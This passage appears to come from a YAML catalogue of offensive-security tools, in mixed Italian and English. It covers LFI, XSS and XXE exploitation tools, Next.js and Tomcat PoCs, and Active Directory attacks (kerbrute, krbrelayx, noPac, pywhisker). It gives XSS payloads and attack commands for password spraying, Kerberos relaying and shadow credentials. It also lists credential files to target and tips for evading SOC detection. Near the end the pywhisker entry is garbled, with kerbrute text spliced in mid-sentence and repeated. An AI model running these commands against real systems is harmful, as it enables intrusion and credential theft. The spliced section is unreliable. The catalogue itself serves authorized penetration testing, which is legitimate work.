    via POST body</li><li><code>data://text/plain;base64,</code> per embed code in
    URL</li><li><code>expect://</code> per command execution se extension loaded</li></ul></p><p><strong>Log
    poisoning:</strong> Inject PHP code in access/error logs via User-Agent o other
    headers, poi include log file per trigger execution.</p><p><strong>Session file
    inclusion:</strong> Inject PHP in session data, poi include session file from
    /var/lib/php/sessions/.</p><p><strong>Upload + LFI:</strong> Upload file con PHP
    code embedded (image with PHP in EXIF), poi include via LFI per execute.</p><h4
    class=\"rt-green\">Tool workflow</h4><p><strong>1. Vulnerability detection:</strong>
    LFiFreak testa parametri sospetti con traversal payloads per identify LFI.</p><p><strong>2.
    Wrapper testing:</strong> Automaticamente prova PHP wrappers disponibili per determine
    exploitation paths.</p><p><strong>3. Bypass enumeration:</strong> Test encoding
    variations (URL encode, double encode, UTF-8) e null byte injection se applicable.</p><p><strong>4.
    Escalation attempts:</strong> Se RCE target, tool propone log poisoning, /proc/self/environ
    manipulation, session attacks.</p><p><strong>5. Interactive exploitation:</strong>
    Se RCE achieved, fornisce interface per command execution.</p><h4 class=\"rt-amber\"\
    >Wordlist e targeting</h4><p>LFiFreak include wordlist di file interessanti per
    platform specifici:<br><strong>Linux:</strong> /etc/passwd, /etc/shadow, /var/log/apache2/access.log,
    /proc/self/environ, ~/.bash_history<br><strong>Windows:</strong> C:\\boot.ini,
    C:\\windows\\system32\\drivers\\etc\\hosts, C:\\inetpub\\logs\\LogFiles\\</p><p>Customizable
    wordlist permette targeting di configuration files application-specific (wp-config.php,
    database.yml, .env files).</p><h4 class=\"rt-red\">Safe testing practices</h4><p>Validare
    impatto su file innocui prima targeting sensitive data. Testing /etc/passwd è
    relatively safe (world-readable, no PII), ma /etc/shadow richiede elevated privileges
    e constitutes attempted unauthorized access. Provare wrapper su file test prima
    applying a sensitive locations. PHP info file leakage è low-risk validation. Log
    poisoning è invasive: può corrupt logs, cause service issues. Test solo in authorized
    environment con rollback capability. Session hijacking risks disrupting legitimate
    user sessions: prefer isolated test accounts. Register vettori efficaci per reporting
    ma avoid actual PII exfiltration. Document minimal proof necessary (first lines
    /etc/passwd, config file structure without credentials). LFI spesso gateway a
    più serious compromises: treat discovery as critical e communicate immediate per
    defensive response coordination.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "Injection", "LFI"]
  notes:

- id: "lfisuite"
  name: "LFISuite"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["lfi-enum", "bypass", "auto-exploit"]
  repo: "https://github.com/D35m0nd142/LFISuite"
  desc: "Toolkit per sfruttare LFI con tecniche enum, bypass, auto-exploitation inclusi
    log/session poisoning per catene LFI-to-RCE"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>LFISuite esegue scanning LFI,
    prova wrapper stream e tecniche note per trasformare inclusione in esecuzione
    codice dove possibile. Utile in exploitation per quantificare impatto e priorità
    mitigazione. Comprehensive toolkit che combines detection, exploitation, e post-exploitation
    capabilities in unified interface.</p><h4 class=\"rt-purple\">Moduli principali</h4><p><strong>Scanner
    module:</strong> Automated detection di LFI vulnerabilities testando parameters
    comuni con traversal payloads e analyzing responses per indicators.</p><p><strong>Exploiter
    module:</strong> Dopo detection, attempts various exploitation techniques:</p><ul><li>PHP
    wrapper exploitation (filter, input, data)</li><li>Log file poisoning (apache,
    nginx, ssh logs)</li><li>Session file inclusion</li><li>/proc/self/environ injection</li><li>File
    upload + inclusion chains</li></ul></p><p><strong>Shell module:</strong> Se RCE
    achieved, provides interactive shell interface per command execution sul target.</p><p><strong>Auxiliary
    tools:</strong> Encoding generators, payload crafters, reverse shell generators
    per facilitate exploitation.</p><h4 class=\"rt-green\">Workflow automatizzato</h4><p><strong>1.
    Target specification:</strong> Provide URL con potentially vulnerable parameter.</p><p><strong>2.
    Vulnerability scanning:</strong> LFISuite testa multiple payloads per confirm
    LFI existence.</p><p><strong>3. Exploitation strategy:</strong> Tool determines
    best exploitation path based su environment detected (OS, web server, PHP configuration).</p><p><strong>4.
    Automated exploitation:</strong> Executes selected techniques sequentially fino
    success o exhaustion.</p><p><strong>5. Post-exploitation:</strong> Se shell obtained,
    transition a interactive mode per further operations.</p><h4 class=\"rt-amber\"\
    >Configuration e customization</h4><p>LFISuite configuration files permettono
    customization di:</p><ul><li>Wordlists per file path enumeration</li><li>User-Agent
    strings per evasion</li><li>Timeout e threading settings</li><li>Logging verbosity
    e output format</li></ul></p><p>Custom payloads aggiungibi per application-specific
    attacks o novel techniques.</p><h4 class=\"rt-red\">Considerazioni etiche</h4><p>Limitare
    scope a target autorizzati con clear permission. LFI exploitation, specialmente
    log poisoning, può essere destructive: corrupt logs rimuove audit trails e può
    impattare operations. Best practice: isolare testing environment, use non-production
    systems quando possibile, maintain backup pre-test. Document ogni azione per audit
    trail e reproducibility. Capture evidenze riproducibili ma evita exfiltration
    dati actual sensitive. RCE via LFI è high-severity finding: immediate communication
    con client e defensive team mandatory. Post-test cleanup: remove injected payloads
    da logs se possibile, restore corrupted files da backup, document affected systems
    per incident response preparation. LFISuite potente ma richiede operator expertise:
    understand ogni technique prima deployment per avoid unintended damage. Alternative
    approach: manual exploitation con better control over ogni step vs automated tool
    che può cause collateral issues. Balance automation convenience con operational
    safety requirements per specific engagement.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "Injection", "LFI"]
  notes:

- id: "liffy"
  name: "liffy"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["lfi-exploit", "rce-primitives", "wrapper-techniques"]
  repo: "https://github.com/mzfr/liffy"
  desc: "Tool exploitation LFI per RCE tramite tecniche note (log poisoning, php://filter,
    session injection) con payload generator e workflow guidato"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Liffy facilita sfruttamento
    LFI con payload pronti per log poisoning, php://input, data: e altre tecniche
    che consentono scrittura/exec indiretta. Usato in web exploitation su sistemi
    vulnerabili per transition da information disclosure a code execution. Tool focused
    su practical exploitation con guided workflow che riduce complexity per operator.</p><h4
    class=\"rt-purple\">Exploitation modules</h4><p><strong>Log poisoning:</strong>
    Inject PHP code in log files via HTTP headers (User-Agent, Referer), poi include
    log per trigger. Supports Apache, Nginx, SSH logs.</p><p><strong>php://input:</strong>
    Se allow_url_include enabled, use POST body con PHP code e include via php://input
    wrapper.</p><p><strong>data:// wrapper:</strong> Embed PHP code in data:// URL
    con base64 encoding per bypass filters.</p><p><strong>Session injection:</strong>
    Manipulate PHP session data per inject code, poi include session file da known
    location.</p><p><strong>Proc filesystem:</strong> Linux-specific techniques usando
    /proc/self/environ per environment variable injection.</p><h4 class=\"rt-green\"\
    >Workflow guidato</h4><p><strong>1. Parameter identification:</strong> Specify
    vulnerable parameter e baseline request.</p><p><strong>2. Environment detection:</strong>
    Liffy probes per determine OS, web server, PHP version, filesystem structure.</p><p><strong>3.
    Technique selection:</strong> Based su environment, tool recommends applicable
    exploitation techniques ranked by success probability.</p><p><strong>4. Payload
    generation:</strong> Automatically generates payloads optimized per selected technique
    e target configuration.</p><p><strong>5. Exploitation execution:</strong> Walks
    through exploitation steps con validation at ogni phase.</p><p><strong>6. Shell
    access:</strong> Se successful, provides command execution interface.</p><h4 class=\"\
    rt-amber\">Payload customization</h4><p>Liffy payload generator permette customization
    per specific scenarios:</p><ul><li>Reverse shell generation con custom IP/port</li><li>Web
    shell upload per persistent access</li><li>Data exfiltration scripts per credential
    harvesting</li><li>Privilege escalation payload staging</li></ul></p><p>Generated
    payloads sono URL-encoded e formatted per direct use in exploitation attempts.</p><h4
    class=\"rt-red\">Testing best practices</h4><p>Provare tecniche in order di invasiveness
    crescente: start con read-only inclusion (php://filter per source disclosure),
    progress a log viewing senza poisoning, poi tentare injection solo se necessary.
    Testing inclusioni innocue first (test.txt invece /etc/passwd) per validate vulnerability
    senza sensitive data access. Log poisoning produce permanent modifications: test
    solo in staging o con explicit cleanup plan. Document file toccati durante exploitation
    per comprehensive remediation guidance. Session manipulation può disrupt active
    user sessions: coordinate timing per minimize impact. Rispettare principle minimal
    necessary proof: achieve command execution con 'id' command è sufficient validation
    senza need per extensive post-exploitation. Liffy è educational tool primarily:
    production environments richiedono manual validation di automated results per
    verify accuracy e prevent false positive-driven actions.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "Injection", "LFI"]
  notes:

- id: "xsstrike-3-1-6"
  name: "XSStrike"
  version: "3.1.6"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["xss-scan", "payload-gen", "crawler", "waf-testing"]
  repo: "https://github.com/s0md3v/XSStrike"
  desc: "Suite avanzata XSS con payload generator intelligente, crawler veloce e WAF
    fuzzer per validation riflessi/DOM e catene account takeover"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>XSStrike combina fuzzing adattivo
    e analisi DOM per rilevare XSS riducendo falsi positivi, con payload contestuali
    e reporting dettagliato. Usato in discovery ed exploitation su applicazioni moderne
    per identify injection points e craft effective payloads che bypass common filters.
    Advanced intelligence distingue XSStrike da basic scanners.</p><h4 class=\"rt-purple\"\
    >Funzionalità chiave</h4><p><strong>Intelligent fuzzing:</strong> Analizza reflection
    context (HTML tag, attribute, JavaScript) e genera payload specifici per quel
    context invece generic payloads.</p><p><strong>WAF detection & bypass:</strong>
    Identifica WAF presenti e automatically attempts bypass techniques (encoding,
    obfuscation, polyglot payloads).</p><p><strong>DOM XSS analysis:</strong> JavaScript
    analysis per identify DOM-based sinks vulnerabili a injection.</p><p><strong>Crawling
    integration:</strong> Built-in crawler per discover parameters automaticamente
    invece manual input.</p><p><strong>Payload optimization:</strong> Genera minimal
    effective payloads riducendo false positive e improving stealth.</p><p><strong>PoC
    generation:</strong> Automatic generation di proof-of-concept con working exploit
    per reporting.</p><h4 class=\"rt-green\">Modalità operative</h4><p><strong>Single
    URL scan:</strong></p><pre><code>python xsstrike.py -u \"https://target.com/search?q=test\"\
    </code></pre><p><strong>Crawl mode:</strong></p><pre><code>xsstrike.py -u https://target.com
    --crawl</code></pre><p><strong>POST parameter testing:</strong></p><pre><code>xsstrike.py
    -u https://target.com/form --data \"name=test&email=test\"</code></pre><p><strong>Custom
    headers:</strong></p><pre><code>xsstrike.py -u target --headers \"Cookie: session=abc123\"\
    </code></pre><p><strong>Blind XSS:</strong></p><pre><code>xsstrike.py -u target
    --blind</code></pre><h4 class=\"rt-amber\">Context-aware payloads</h4><p>XSStrike
    analizza dove input reflected e genera payload accordingly:<br><strong>HTML context:</strong>
    <code>&lt;img src=x onerror=alert(1)&gt;</code><br><strong>Attribute context:</strong>
    <code>\" onmouseover=alert(1) \"</code><br><strong>JavaScript context:</strong>
    <code>'; alert(1);//</code><br><strong>Event handler:</strong> <code>alert(1)</code>
    (già in execution context)</p><p>Context awareness dramatically increases success
    rate vs blind payload injection.</p><h4 class=\"rt-red\">Workflow integration</h4><p>Alimentare
    con liste parametri da ParamSpider: <code>cat params.txt | while read url; do
    python xsstrike.py -u \"$url\"; done</code>. Limit depth e threads per non overload
    target: <code>--skip --skip-dom</code> flags per faster scanning quando DOM analysis
    non necessaria. Validare manualmente injection confirmed per eliminate false positives:
    automated tools possono misinterpret reflection as exploitable. Output salvataggio
    essenziale per tracking findings across engagements: <code>--file-log results.txt</code>.
    XSStrike potente per discovery ma exploitation chains (cookie stealing, keylogging,
    BeEF hooks) richiedono manual crafting based su application context e defensive
    measures present. Treat findings come leads requiring validation piuttosto che
    guaranteed vulnerabilities: context matters significantly in XSS exploitability
    assessment.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "Injection", "XSS"]
  notes:

- id: "xxeinjector"
  name: "XXEinjector"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["xxe-auto", "oob-exfil", "dir-enum"]
  repo: "https://github.com/enjoiz/XXEinjector"
  desc: "Automatizza l'exploitation XXE con canali in-band e OOB (file disclosure,
    SSRF, RCE in catena)."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>XXEinjector genera payload e
    orchestration per XXE, supportando exfiltrazione file locali, SSRF e interazione
    con listener OOB (FTP/HTTP) per catturare dati o eseguire chained attacks.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Template di payload per diverse
    librerie XML.</li><li>Supporto a OOB via dtd/ftp/http, encoding e bypass WAF.</li><li>Modalità
    interattiva e scriptabile.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Isolare
    i listener OOB e limitare i path provati; rispettare i confini autorizzati del
    test.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "Injection", "XXE"]
  notes:

- id: "poc-cve-2025-29927"
  name: "PoC CVE-2025-29927"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["02_Exploitation"]
  caps: ["auth-bypass", "header-manipulation", "nextjs-middleware"]
  repo: ""
  desc: "PoC per CVE‑2025‑29927 (Next.js): bypass dell’autorizzazione lato middleware
    tramite header interni."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Proof‑of‑Concept focalizzato
    sul bypass dell’autorizzazione di Next.js Middleware sfruttando l’header interno
    x‑middleware‑subrequest. Include note su versioni impattate e vettori tipici.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Richieste craftate per saltare i
    controlli del middleware.</li><li>Indicazioni su detection e mitigazioni.</li><li>Compatibilità
    con build locali per riprodurre il bug.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Usare
    solo su app di test o con consenso; aggiornare Next.js alle versioni patchate.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "Next_js"]
  notes:

- id: "cnvd-2020-10487-tomcat-ajp-lfi"
  name: "CNVD-2020-10487-Tomcat-Ajp-lfi"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["02_Exploitation"]
  caps: ["ajp-lfi", "ghostcat", "file-read"]
  repo: "https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi"
  desc: "PoC LFI per Apache Tomcat via AJP (CNVD‑2020‑10487): lettura file locali
    e verifica di vulnerabilità."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>PoC per la vulnerabilità di
    file disclosure su connettore AJP di Tomcat. Consente di validare la presenza
    del bug e leggere file arbitrari in configurazioni vulnerabili.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>Costruzione pacchetti AJP e richieste malformate.</li><li>Targeting
    diretto di risorse e traversal comuni.</li><li>Output chiaro per triage e reporting.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire solo su istanze autorizzate. Aggiornare/mitigare
    il connettore AJP secondo le linee guida del vendor.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Web", "Tomcat"]
  notes:

- id: "kerbrute-linux-amd64"
  name: "kerbrute_linux_amd64"
  version: "1.0.3"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["kerberos-preauth", "user-enum", "password-spraying"]
  repo: "https://github.com/ropnop/kerbrute"
  desc: "Tool Go per user enum e password spraying via Kerberos pre-auth a basso rumore,
    versione Linux con binaries precompilati"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute versione Linux (Go
    binary precompilato) effettua user enumeration e credential validation direttamente
    sul KDC (AS-REQ/AS-REP) via TCP/UDP 88. Usato in initial access e recon per testare
    utenti/password senza traffico SMB/LDAP visibile. Versione di riferimento: 1.0.3
    con binaries precompilati per multiple architetture.</p><h4 class=\"rt-purple\"\
    >Vantaggi rispetto a metodi tradizionali</h4><p><strong>Stealth:</strong> AS-REQ
    verso KDC sono traffico legittimo, meno monitorate di failed logon SMB. Eventi
    generati: 4768 (TGT requested) o 4771 (pre-auth failed) invece 4625 (failed logon).</p><p><strong>Velocità:</strong>
    Go concurrency nativa permette migliaia username/password test rapidamente con
    rate limit configurabile.</p><p><strong>Precision:</strong> AS-REQ error codes
    distinguono: account inesistenti (KDC_ERR_C_PRINCIPAL_UNKNOWN) da password errate
    (KDC_ERR_PREAUTH_FAILED), eliminando false positive.</p><p><strong>No SMB dependency:</strong>
    Funziona anche quando SMB blocked/filtered, solo porta 88 necessaria.</p><h4 class=\"\
    rt-green\">Comandi principali</h4><p><strong>User enumeration:</strong></p><pre><code>./kerbrute_linux_amd64
    userenum -d acme.local --dc 192.168.1.10 users.txt</code></pre><p><strong>Password
    spraying:</strong></p><pre><code>./kerbrute_linux_amd64 passwordspray -d acme.local
    --dc DC01 users.txt Password123!</code></pre><p><strong>Brute force singolo user
    (sconsigliato):</strong></p><pre><code>./kerbrute_linux_amd64 bruteuser -d acme.local
    passwords.txt admin --delay 5s</code></pre><p><strong>Con delay e output:</strong></p><pre><code>./kerbrute_linux_amd64
    passwordspray -d acme.local users.txt Winter2025! --delay 2s -o results.txt</code></pre><p><strong>Verbose
    mode:</strong></p><pre><code>./kerbrute_linux_amd64 userenum -d acme.local users.txt
    -v</code></pre><h4 class=\"rt-amber\">Best practice operative</h4><p>Sempre specificare
    <code>--delay</code> minimo 1-2 secondi per rispettare lockout policy. Usare IP
    diretto DC con <code>--dc</code> per evitare DNS lookup ripetuti che generano
    rumore. Limitare concurrency con <code>-t</code> su reti lente o DC sovraccarichi
    (default 10 threads). Testare con piccoli subset prima di full wordlist per validate
    formato userlist. Salvare output sistematicamente per correlare con altre fonti
    (BloodHound, LDAP enum). Format userlist: sAMAccountName without domain (admin
    non ACME\\admin). Combinare con username-anarchy per generare userlist realistiche
    da nomi/cognomi. Integrare risultati con TGT/TGS validation post-success per confermare
    credentials funzionali oltre pre-auth.</p><h4 class=\"rt-red\">Rilevamento e mitigazioni</h4><p>Pre-authentication
    failures (4771) meno monitorate di full logon failures ma pattern anomali (burst
    da singolo IP) possono alertare SOC maturi. Rate limiting essenziale: 10-20 requests/second
    max per avoid triggering alarms. Password spraying strategy: 1-2 password per
    account con 30+ minuti delay tra round versus brute-force singolo account. SOC
    maturi monitorano spike eventi 4771 da single source IP. AS-REQ con encryption
    type debole (RC4) possono essere flagged. Pattern temporali anomali (burst uniform)
    distinguono da traffico user normale. Mitigazioni difensive: pre-auth obbligatoria
    per tutti account (default in modern AD), monitoring 4771 events con thresholding,
    rate limiting firewall-level su 88/tcp-udp, account lockout policy strict ma not
    too aggressive (avoid DOS). Kerbrute detection signature: binary precompilato
    può essere fingerprinted, consider compilation from source con customization per
    evasion in red team operations. Alternative detection: behavioral analytics identificano
    pattern enum anche quando individual requests appear legitimate.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
  notes:

- id: "krbrelayx"
  name: "krbrelayx"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["kerberos-relay", "unconstrained-delegation", "adcs-abuse"]
  repo: "https://github.com/dirkjanm/krbrelayx"
  desc: "Toolkit per Kerberos relaying e abusi delegation (unconstrained/AD CS) con
    utility DNS/LDAP integration e dipendenze impacket/ldap3"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>krbrelayx abilita tecniche Kerberos
    relaying e abuse delegation: cattura AP-REQ e li rilancia verso servizi come LDAP/HTTP/AD
    CS per modifiche directory, richiesta certificati o accessi SMB. Usato in post-compromise
    per escalation/persistence, spesso insieme a mitm6 e configurazioni AD CS vulnerabili.
    Comprehensive toolkit per advanced Kerberos attacks.</p><h4 class=\"rt-purple\"\
    >Componenti principali</h4><p><strong>krbrelayx.py:</strong> Main relay tool per
    Kerberos authentication relay verso target services.</p><p><strong>dnstool.py:</strong>
    DNS manipulation utility per add/remove/modify DNS records in AD-integrated zones.</p><p><strong>addspn.py:</strong>
    SPN manipulation per configure service principal names su accounts.</p><p><strong>printerbug.py:</strong>
    Trigger printer spooler authentication per coerce authentication da target.</p><h4
    class=\"rt-green\">Attack scenarios</h4><p><strong>Unconstrained delegation abuse:</strong>
    Capture TGT da host con unconstrained delegation, relay per privileged access.</p><p><strong>AD
    CS relay:</strong> Relay Kerberos auth a AD CS web enrollment endpoints per request
    certificates as target machine/user.</p><p><strong>LDAP relay:</strong> Relay
    authentication a LDAP per modify AD objects, add computer accounts, change ACLs.</p><p><strong>Resource-based
    constrained delegation:</strong> Configure RBCD su target per establish persistent
    access path.</p><h4 class=\"rt-amber\">Workflow tipico con mitm6</h4><p><strong>1.
    DNS poisoning setup:</strong></p><pre><code>mitm6 -d acme.local</code> (poison
    IPv6 DNS)</p><p><strong>2. Relay configuration:</strong><br><code>python krbrelayx.py
    -t ldap://dc01.acme.local</code></pre><p><strong>3. Coerce authentication:</strong><br><code>python
    printerbug.py target dc01</code> (trigger auth from target)</p><p><strong>4. Relay
    exploitation:</strong> krbrelayx intercepts authentication, relays a LDAP per
    privileged modifications.</p><p><strong>5. Post-exploitation:</strong> Abuse configurate
    delegation o requested certificates per further access.</p><h4 class=\"rt-red\"\
    >Dipendenze e setup</h4><p><strong>Requirements:</strong> impacket, ldap3, dnspython,
    pyasn1. Install: <code>pip install impacket ldap3 dnspython</code>. Scoping rigoroso
    essenziale: relay attacks può affect production authentication flows. Liste esclusione
    per critical systems (domain controllers, sensitive servers). Monitoring log DC
    durante operations per catch issues early. Teardown pulito: remove DNS entries
    created, revert ACL modifications, delete computer accounts added. krbrelayx genera
    significant authentication traffic: coordinate con blue team per authorized testing.
    LDAP signing e EPA (Extended Protection for Authentication) sono effective mitigations:
    verify defensive posture before relay attempts. Certificate-based attacks require
    AD CS presence: reconnaissance per identify Certificate Services installations
    prerequisite. Modern defenses (LDAP channel binding, SMB signing enforcement)
    significatively reduce relay attack surface: expect lower success rate in hardened
    environments versus legacy AD deployments.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
  notes:

- id: "nopac"
  name: "noPac"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["03_Post_Exploitation"]
  caps: ["cve-2021-42278", "cve-2021-42287", "priv-esc-da"]
  repo: "https://github.com/Ridter/noPac"
  desc: "Exploit chain CVE-2021-42278/42287 per impersonare Domain Admin da utente
    standard su DC unpatched con sAMAccountName manipulation"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>noPac combina CVE-2021-42278
    e CVE-2021-42287 per ottenere TGT privilegiato impersonando DC: da utente low-priv
    si modifica sAMAccountName di computer account, poi si ottiene ticket elevato
    tramite richiesta mirata al KDC. Usato in exploitation strettamente autorizzata
    per evidenziare impatto critico e urgenza patch. Exploitation produce permanent
    changes requiring careful rollback.</p><h4 class=\"rt-purple\">Vulnerability chain</h4><p><strong>CVE-2021-42278:</strong>
    Permette rename computer account sAMAccountName per match Domain Controller naming
    (es. DC01$), bypassing normal restrictions.</p><p><strong>CVE-2021-42287:</strong>
    Durante Kerberos ticket renewal, KDC fails properly validate sAMAccountName changes,
    issuing TGT as if request came from legitimate DC.</p><p><strong>Combined impact:</strong>
    Attacker con standard domain user credentials può obtain TGT con Domain Admin
    privileges, achieving full domain compromise.</p><h4 class=\"rt-green\">Exploitation
    prerequisites</h4><p><strong>Domain user account:</strong> Valid credentials per
    any non-privileged domain user.</p><p><strong>Ability create computer accounts:</strong>
    Default ms-DS-MachineAccountQuota permette domain users create up to 10 computer
    accounts.</p><p><strong>Vulnerable DC:</strong> Domain Controller senza patches
    November 2021 (KB5008602 e subsequent).</p><h4 class=\"rt-amber\">Execution workflow</h4><p><strong>1.
    Create computer account:</strong> noPac automatically creates computer account
    con nome strategico.</p><p><strong>2. sAMAccountName manipulation:</strong> Rename
    computer account per impersonate DC (remove trailing $).</p><p><strong>3. Request
    TGT:</strong> Request ticket as fake DC, KDC issues privileged TGT.</p><p><strong>4.
    sAMAccountName restore:</strong> Restore original name (re-add $) per avoid detection.</p><p><strong>5.
    Ticket renewal:</strong> Renew TGT, KDC grants DA privileges due CVE-2021-42287.</p><p><strong>6.
    Domain Admin actions:</strong> Use elevated ticket per DCSync, create persistent
    access, etc.</p><h4 class=\"rt-red\">Testing safety e remediation</h4><p>Dopo
    test: ripristinare attributi modificati immediatamente. Revocare ticket emessi:
    <code>klist purge</code> su all systems involved. Delete computer account created
    durante exploit. Allineare tutti DC alle patch November 2021 e subsequent: KB5008602
    (Server 2019), KB5008601 (Server 2016), equivalents per other versions. Post-patch
    validation: re-test con same exploit per confirm mitigation effectiveness. Detection
    opportunities: monitor per sAMAccountName changes su computer accounts, unusual
    TGT requests from non-DC sources, multiple computer account creations in short
    timeframe. noPac sfrutta fundamental Kerberos trust assumptions: patches modificano
    validation logic riducendo attack surface. Modern AD environments dovrebbero avere
    patches già applicati (vulnerability disclosed Q4 2021), ma legacy environments
    possono remain vulnerable. Testing raccomandato solo in isolated lab o con explicit
    client authorization su non-production domains. Exploitation risk: può destabilize
    authentication flows se mal eseguito, può leave forensics artifacts requiring
    extensive cleanup.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
  notes:

- id: "pkinittools"
  name: "PKINITtools"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["pkinit", "adcs-relay", "certificate-auth"]
  repo: "https://github.com/dirkjanm/PKINITtools"
  desc: "Strumenti per PKINIT e relaying verso AD CS: richiesta TGT con smartcard/credenziali
    e attacchi di relay."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>PKINITtools facilita scenari
    Kerberos avanzati: autenticazione basata su certificati (PKINIT), richiesta TGT
    via chiavi private e relaying verso Active Directory Certificate Services per
    ottenere accessi o certificati.</p><h4 class=\"rt-blue\">Funzioni chiave</h4><ul><li>TGT
    via certificato (smartcard) e parsing KDC.</li><li>Relay a AD CS (ESC1/ESC8) e
    abusi PKI correlati.</li><li>Integrazione con impacket, certipy e tool AD.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Richiede forte coordinamento con Blue Team.
    Limitare la persistenza dei materiali chiave e bonificarli a fine test.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
  notes:

- id: "pywhisker"
  name: "pywhisker"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["adcs-esc", "keycredentiallink", "shadow-credentials"]
  repo: "https://github.com/ShutdownRepo/pywhisker"
  desc: "Implementazione Python attacco Whisker per manipolare msDS-KeyCredentialLink
    e ottenere controllo account via Shadow Credentials technique"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>pyWhisker consente abuso msDS-KeyCredentialLink
    aggiungendo chiavi per autenticazione basata su certificati/keys (Shadow Credentials),
    ottenendo controllo oggetto target. Usato in post-compromise per persistence o
    escalation, spesso insieme PKINITtools (TGT via PKINIT). Supports cross-domain
    scenarios documented dal maintainer.</p><h4 class=\"rt-purple\">Shadow Credentials
    technique</h4><p><strong>Attribute abuse:</strong> msDS-KeyCredentialLink attribute
    stores public keys per Windows Hello for Business. Attacker con write permissions
    può add own key pair, allowing authentication as target without knowing password.</p><p><strong>Attack
    flow:</strong> Generate key pair → Write public key to target msDS-KeyCredentialLink
    → Request TGT using private key via PKINIT → Authenticate as target user/computer.</p><p><strong>Permissions
    required:</strong> Write access su msDS-KeyCredentialLink attribute (GenericAll,
    GenericWrite, WriteProperty) del target object.</p><h4 class=\"rt-green\">Utilizzo
    operativo</h4><p><strong>List existing keys:</strong></p><pre><code>python pywhisker.py
    -d acme.local -u attacker -p password --target targetuser --action list</code></pre><p><strong>Add
    shadow credential:</strong></p><pre><code>python pywhisker.py -d acme.local -u
    attacker -p password --target targetuser --action add --filename targetuser</code><br>Generates
    PFX certificate e private key.</p><p><strong>Request TGT con PKINITtools:</strong><br><code>python
    gettgtpkinit.py -cert-pfx targetuser.pfx -dc-ip DC01 acme.local/targetuser targetuser.ccache</code></pre><p><strong>Remove
    shadow credential (cleanup):</strong></p><pre><code>python pywhisker.py -d acme.local
    -u attacker -p password --target targetuser --action remove --device-id &lt;id&gt;</code></pre><h4
    class=\"rt-amber\">Privilege escalation paths</h4><p><strong>Computer account
    takeover:</strong> Se write permissions su computer object, add shadow credential
    per authenticate as machine, enabling DCSync-like operations se computer has replication
    rights.</p><p><strong>Service account compromise:</strong> Target service accounts
    con write permissions per obtain credentials senza cracking passwords.</p><p><strong>Persistence
    mechanism:</strong> Shadow credentials persistent across password changes, providing
    durable access path finché attribute not audited.</p><h4 class=\"rt-red\">Detection
    e cleanup</h4><p>Operativamente: indicare target, dominio e credenziali con write
    permissions; gestire cleanup chiavi con attenzione e annotare oggetti modificati.
    Tracking: Document ogni shadow credential added con target object DN, timestamp,
    device-ID per comprehensive cleanup. Detection opportunities: Monitor msDS-KeyCredentialLink
    modifications (Event ID 5136), unusual PKINIT authentications from non-standard
    devices, mismatches tra expected devices e actual key registrations. Mitigations:
    Restrict write permissions su msDS-KeyCredentialLink attribute, monitor attribute
    changes via SIEM, regular audits di registered keys versus legitimate devices,
    consider disabling WHfB se not used organizationally. Post-engagement: Remove
    all added keys using device-ID captured during addition, verify removal con list
    action, document modifications inare con TGT/TGS validation post-success per confirm
    credentials funzionali oltre pre-auth. Pre-authentication failures (4771) meno
    monitorate di full logon failures ma pattern anomali (burst da singolo IP) possono
    alertare SOC maturi. Rate limiting essenziale: 10-20 requests/second max per avoid
    triggering alarms. Password spraying strategy: 1-2 password per account con 30+
    minuti delay tra round versus brute-force singolo account.</p><h4 class=\"rt-red\"\
    >Detection e mitigazioni</h4><p>SOC maturi monitorano spike eventi 4771 da single
